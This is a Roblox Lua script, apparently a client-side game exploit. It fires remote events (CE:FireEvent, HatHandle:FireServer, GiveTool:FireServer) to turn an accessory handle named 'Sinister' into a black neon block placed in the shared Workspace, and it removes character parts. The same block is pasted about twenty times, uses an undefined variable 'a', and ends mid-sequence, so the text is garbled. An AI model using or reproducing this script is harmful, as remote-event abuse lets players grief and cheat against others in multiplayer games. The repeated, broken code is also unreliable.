CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Anchored",false)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"CanCollide",true)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Parent",game.Workspace)
game.Players.LocalPlayer.Character["14129625"]:Remove()
game.Players.LocalPlayer.Character["PhantomMask"]:Remove()
game.ReplicatedStorage.AvatarEditor.HatHandle:FireServer(14129625)
MainUserW:WaitForChild("14129625")
game.Workspace.GiveTool:FireServer(a, "PompousTheCloud")   
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Handle"],"Name","Sinister")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"]["Mesh"],"Parent",workspace)
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Size",Vector3.new(5.43, 1, 2))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"BrickColor",BrickColor.new("Really black"))
CE:FireEvent("PompousTheCloud",MainUserW["14129625"]["Sinister"],"Material",Enum.Material.Neon)
